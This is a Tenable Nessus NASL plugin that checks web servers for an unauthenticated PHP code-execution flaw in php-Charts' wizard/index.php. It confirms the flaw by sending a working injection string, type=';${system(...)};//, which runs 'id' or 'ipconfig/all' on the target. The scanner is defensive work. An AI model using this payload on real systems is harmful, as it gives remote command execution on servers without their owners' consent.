#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(67174);
  script_version("1.9");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");
  script_bugtraq_id(57448);
  script_xref(name:"EDB-ID", value:"25496");
  script_xref(name:"EDB-ID", value:"26453");

  script_name(english:"php-Charts wizard/index.php PHP Execution");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts an application that allows arbitrary PHP
code execution.");
  script_set_attribute(attribute:"description", value:
"The php-Charts install hosted on the remote web server contains a flaw
that could allow arbitrary PHP code execution.  Input passed to the
'wizard/index.php' script is not properly sanitized before being used in
an eval() call.  An unauthenticated, remote attacker could leverage this
vulnerability to execute arbitrary PHP code on the remote host.");
  script_set_attribute(attribute:"see_also", value:"http://www.php-charts.com");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'PHP-Charts v1.0 PHP Code Execution Vulnerability');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/05/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/07/03");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:php_charts:php_charts");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("php_charts_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("www/php-charts");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("data_protection.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(appname:'php-charts', port:port, exit_on_fail:TRUE);

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ('Windows' >< os)
    cmds['ipconfig/all'] = 'Windows IP Configuration|IP(v[46])? Address[ .]+: ';
  else
    cmds['id'] = 'uid=[0-9]+.*gid=[0-9]+.*';
}
else
{
    cmds['ipconfig/all'] = 'Windows IP Configuration|IP(v[46])? Address[ .]+: ';
    cmds['id'] = 'uid=[0-9]+.*gid=[0-9]+.*';
}

foreach cmd (keys(cmds))
{
  output = "";
  url = install['dir']+"/wizard/index.php?type=';${system('"+cmd+"')};//";
  res = http_send_recv3(
    method : "GET",
    item   : url,
    port   : port,
    exit_on_fail:TRUE
  );

  body = res[2];
  if (!egrep(string:body, pattern:cmds[cmd])) continue;
  output = body;

  # Remove any leading PHP errors or HTML
  if ("ipconfig" >< cmd)
    output_starter = "Windows IP Config";
  else
    output_starter = "uid=";

  output = substr(output, stridx(output, output_starter));

  # Remove any trailing PHP errors or HTML
  if ("<" >< output)
  {
    html_start = stridx(output, "<");
    output = substr(output, 0, html_start - 1);
  }

  # Trim output if overly lengthy
  output = beginning_of_response(resp:output, max_lines:20);

  break;
}

if (strlen(output) > 0)
{
  if (report_verbosity > 0)
  {
    # Add request
    report =
      '\nNessus executed "' + cmd + '" by sending the following request :\n\n' +
      crap(data:'-', length:30) + " request " + crap(data:'-', length:30) + '\n' +
      chomp(http_last_sent_request()) + '\n' +
      crap(data:'-', length:30) + " request " + crap(data:'-', length:30) + '\n';

      # Add command output
      if (report_verbosity > 1)
        report += '\nWhich resulted in the following command output :\n\n' + data_protection::sanitize_uid(output:output);

    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else
{
  base_url = build_url(qs:install['dir']+'/', port:port);
  audit(AUDIT_WEB_APP_NOT_AFFECTED, "php-Charts", base_url);
}
